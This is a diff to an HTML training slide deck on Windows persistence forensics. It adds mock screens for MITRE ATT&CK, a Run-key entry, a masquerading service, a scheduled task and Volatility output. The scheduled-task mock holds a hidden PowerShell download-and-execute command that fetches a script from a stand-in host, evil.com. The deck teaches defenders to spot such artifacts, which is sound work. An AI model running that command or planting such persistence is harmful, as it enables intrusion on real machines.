@@ -34,6 +34,64 @@
         .nav-btn:hover { transform: scale(1.2); }
         .slide-container { display: none; }
         .slide-container.active { display: flex; }
+        .mock-window {
+            width: 100%;
+            height: 440px;
+            background: #020617;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+            position: relative;
+        }
+        .mock-header {
+            background: #1e293b;
+            padding: 8px 15px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 14px;
+            color: #94a3b8;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #334155;
+        }
+        .mock-header::before {
+            content: '•••';
+            letter-spacing: 2px;
+            color: #475569;
+            margin-right: 15px;
+            font-size: 18px;
+            line-height: 1;
+        }
+        .mock-content {
+            flex: 1;
+            overflow: auto;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 13px;
+            line-height: 1.5;
+            padding: 20px;
+            color: #e2e8f0;
+        }
+        .mitre-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            gap: 5px;
+            font-size: 10px;
+            text-align: center;
+        }
+        .mitre-cell {
+            background: #1e293b;
+            padding: 5px;
+            border-radius: 3px;
+            border: 1px solid #334155;
+        }
+        .mitre-cell.persistence {
+            background: rgba(239, 68, 68, 0.2);
+            border-color: #ef4444;
+            color: #f87171;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -69,9 +127,35 @@
                     </div>
                 </div>
                 <div>
-                    <div class="image-wrapper" style="background: white; border-radius: 8px; padding: 10px;">
-                        <img src="https://miro.medium.com/v2/resize:fit:1200/1*C680H47pIu86eX-3zP3A7g.png" alt="MITRE ATT&CK Matrix Persistence Tactic" style="max-height: 400px; width: auto; object-fit: contain;">
-                    </div>
+                    <div class="mock-window" style="height: 400px;">
+                                            <div class="mock-header">MITRE ATT&CK Matrix</div>
+                                            <div class="mock-content" style="padding: 10px;">
+                                                <div class="mitre-grid">
+                                                    <div class="mitre-cell">Recon</div>
+                                                    <div class="mitre-cell">Resource Dev</div>
+                                                    <div class="mitre-cell">Initial Access</div>
+                                                    <div class="mitre-cell">Execution</div>
+                                                    <div class="mitre-cell persistence">Persistence</div>
+                                                    <div class="mitre-cell">Privilege Esc</div>
+                                                    <div class="mitre-cell">Defense Evasion</div>
+                                                    <div class="mitre-cell">Credential Access</div>
+                                                    <div class="mitre-cell">Discovery</div>
+                                                    <div class="mitre-cell">Lateral Movement</div>
+                                                    <div class="mitre-cell">Collection</div>
+                                                    <div class="mitre-cell">C2</div>
+                                                    <div class="mitre-cell">Exfiltration</div>
+                                                    <div class="mitre-cell">Impact</div>
+                                                </div>
+                                                <div style="margin-top: 10px; padding: 10px; background: #0f172a; border-radius: 4px; font-size: 11px;">
+                                                    <div style="color: #ef4444; font-weight: bold; margin-bottom: 5px;">TA0003 - Persistence Techniques:</div>
+                                                    <div style="color: #cbd5e1;">- T1547.001 Boot or Logon Autostart</div>
+                                                    <div style="color: #cbd5e1;">- T1053.005 Scheduled Task/Job</div>
+                                                    <div style="color: #cbd5e1;">- T1543.003 Create or Modify System Process</div>
+                                                    <div style="color: #cbd5e1;">- T1136 Create Account</div>
+                                                    <div style="color: #cbd5e1;">- ...and 30+ more</div>
+                                                </div>
+                                            </div>
+                                        </div>
                 </div>
             </div>
         </div>
@@ -128,9 +212,28 @@
                     </ul>
                 </div>
                 <div>
-                    <div class="image-wrapper">
-                        <img src="https://belkasoft.com/images/articles/windows-registry-analysis-structure/windows-registry-01-registry-editor.png" alt="Registry Structure Diagram">
-                    </div>
+                    <div class="mock-window" style="height: 400px; border-color: #22c55e;">
+                                            <div class="mock-header">Registry Editor</div>
+                                            <div class="mock-content" style="display: flex; padding: 0; font-size: 12px;">
+                                                <div style="width: 40%; border-right: 1px solid #334155; padding: 15px;">
+                                                    <i class="fa-solid fa-folder-open" style="color: #facc15;"></i> HKEY_CURRENT_USER<br>
+                                                    &nbsp;&nbsp;<i class="fa-solid fa-folder-open" style="color: #facc15;"></i> Software<br>
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;<i class="fa-solid fa-folder-open" style="color: #facc15;"></i> Microsoft<br>
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class="fa-solid fa-folder-open" style="color: #facc15;"></i> Windows<br>
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class="fa-solid fa-folder-open" style="color: #facc15;"></i> CurrentVersion<br>
+                                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class="fa-solid fa-folder" style="color: #facc15; background: rgba(34, 197, 94, 0.2); padding: 2px;"></i> Run
+                                                </div>
+                                                <div style="width: 60%; padding: 15px; background: #0f172a;">
+                                                    <div style="display: grid; grid-template-columns: 1fr 1fr 2fr; gap: 5px; color: #94a3b8; border-bottom: 1px solid #334155; padding-bottom: 5px; margin-bottom: 5px;">
+                                                        <span>Name</span><span>Type</span><span>Data</span>
+                                                    </div>
+                                                    <div style="display: grid; grid-template-columns: 1fr 1fr 2fr; gap: 5px;">
+                                                        <span>(Default)</span><span>REG_SZ</span><span>(value not set)</span>
+                                                        <span style="background: rgba(239, 68, 68, 0.2); color: #f87171;">Updater</span><span>REG_SZ</span><span style="background: rgba(239, 68, 68, 0.2); color: #f87171;">C:\Users\Admin\AppData\svchost.exe</span>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
                 </div>
             </div>
         </div>
@@ -157,9 +260,26 @@
                     </ul>
                 </div>
                 <div>
-                    <div class="image-wrapper">
-                        <img src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2026/03/image-7.webp" alt="Service Masquerading Example">
-                    </div>
+                    <div class="mock-window" style="height: 400px; border-color: #3b82f6;">
+                                            <div class="mock-header">Services</div>
+                                            <div class="mock-content" style="padding: 10px; font-size: 11px;">
+                                                <div style="display: grid; grid-template-columns: 2fr 3fr 1fr 1fr; gap: 5px; color: #94a3b8; border-bottom: 1px solid #334155; padding-bottom: 5px; margin-bottom: 5px;">
+                                                    <span>Name</span><span>Description</span><span>Status</span><span>Startup Type</span>
+                                                </div>
+                                                <div style="display: grid; grid-template-columns: 2fr 3fr 1fr 1fr; gap: 5px; line-height: 1.2;">
+                                                    <span>...</span><span></span><span></span><span></span>
+                                                    <span>Microsoft Update Service</span><span>Handles core updates...</span><span>Running</span><span>Automatic</span>
+                                                    <span style="background: rgba(239, 68, 68, 0.2); color: #f87171;">MicrosoftUpdateSvc</span><span style="background: rgba(239, 68, 68, 0.2); color: #f87171;">Provides critical update...</span><span style="background: rgba(239, 68, 68, 0.2); color: #f87171;">Running</span><span style="background: rgba(239, 68, 68, 0.2); color: #f87171;">Automatic</span>
+                                                    <span>Print Spooler</span><span>This service spools print...</span><span></span><span>Automatic</span>
+                                                    <span>...</span><span></span><span></span><span></span>
+                                                </div>
+                                                <div style="margin-top: 20px; padding: 10px; background: #0f172a; border-radius: 4px; border-left: 3px solid #60a5fa;">
+                                                    <div style="color: #94a3b8;">Properties for MicrosoftUpdateSvc</div>
+                                                    <div style="margin-top: 5px;">Path to executable:</div>
+                                                    <div style="color: #f87171; margin-top: 2px;">C:\Windows\Temp\msupdate.exe -s</div>
+                                                </div>
+                                            </div>
+                                        </div>
                 </div>
             </div>
         </div>
@@ -185,9 +305,26 @@
                     </ul>
                 </div>
                 <div>
-                    <div class="image-wrapper">
-                        <img src="https://www.cybertriage.com/wp-content/uploads/2024/08/WINDOWS-SCHEDULED-TASKS-1200x720.png" alt="Scheduled Tasks for DFIR">
-                    </div>
+                    <div class="mock-window" style="height: 400px; border-color: #eab308;">
+                                            <div class="mock-header">C:\Windows\System32\Tasks\AdobeUpdate</div>
+                                            <div class="mock-content" style="font-size: 12px;">
+                                                <span style="color: #94a3b8;">&lt;?xml version="1.0" encoding="UTF-16"?&gt;</span><br>
+                                                <span style="color: #94a3b8;">&lt;Task version="1.2" ...&gt;</span><br>
+                                                &nbsp;&nbsp;<span style="color: #94a3b8;">&lt;Triggers&gt;</span><br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #94a3b8;">&lt;LogonTrigger&gt;</span><br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #60a5fa;">&lt;Enabled&gt;</span>true<span style="color: #60a5fa;">&lt;/Enabled&gt;</span><br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #94a3b8;">&lt;/LogonTrigger&gt;</span><br>
+                                                &nbsp;&nbsp;<span style="color: #94a3b8;">&lt;/Triggers&gt;</span><br>
+                                                &nbsp;&nbsp;<span style="color: #94a3b8;">&lt;Principals&gt;...&lt;/Principals&gt;</span><br>
+                                                &nbsp;&nbsp;<span style="color: #94a3b8;">&lt;Actions&gt;</span><br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #94a3b8;">&lt;Exec&gt;</span><br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #60a5fa;">&lt;Command&gt;</span><span style="color: #f87171;">powershell.exe</span><span style="color: #60a5fa;">&lt;/Command&gt;</span><br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #60a5fa;">&lt;Arguments&gt;</span><span style="color: #f87171;">-nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')"</span><span style="color: #60a5fa;">&lt;/Arguments&gt;</span><br>
+                                                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #94a3b8;">&lt;/Exec&gt;</span><br>
+                                                &nbsp;&nbsp;<span style="color: #94a3b8;">&lt;/Actions&gt;</span><br>
+                                                <span style="color: #94a3b8;">&lt;/Task&gt;</span>
+                                            </div>
+                                        </div>
                 </div>
             </div>
         </div>
@@ -209,9 +346,21 @@
                     </div>
                 </div>
                 <div>
-                    <div class="image-wrapper">
-                        <img src="https://miro.medium.com/v2/resize:fit:1400/1*wi4Ov6KzeeJpLQFSWB7iyA.jpeg" alt="Lab Infrastructure Diagram">
-                    </div>
+                    <div class="mock-window" style="height: 400px; border-color: #22c55e;">
+                                            <div class="mock-header">user@sift:~/evidence$</div>
+                                            <div class="mock-content">
+                                                <span style="color: #4ade80;">$</span> vol.py -f suspect.vmem windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"<br>
+                                                <span style="color: #4ade80;">Volatility 3 Framework 2.4.1</span><br>
+                                                <br>
+                                                Hive: \??\C:\Users\Admin\NTUSER.DAT<br>
+                                                Key: Software\Microsoft\Windows\CurrentVersion\Run<br>
+                                                <br>
+                                                Last Write Time: 2023-10-26 14:20:15Z<br>
+                                                Values:<br>
+                                                REG_SZ&nbsp;&nbsp;&nbsp;&nbsp;OneDrive&nbsp;&nbsp;&nbsp;&nbsp;"C:\Program Files\Microsoft OneDrive\OneDrive.exe"<br>
+                                                <span style="background: rgba(239, 68, 68, 0.2); color: #f87171;">REG_SZ&nbsp;&nbsp;&nbsp;&nbsp;Updater&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Users\Admin\AppData\svchost.exe</span>
+                                            </div>
+                                        </div>
                 </div>
             </div>
         </div>
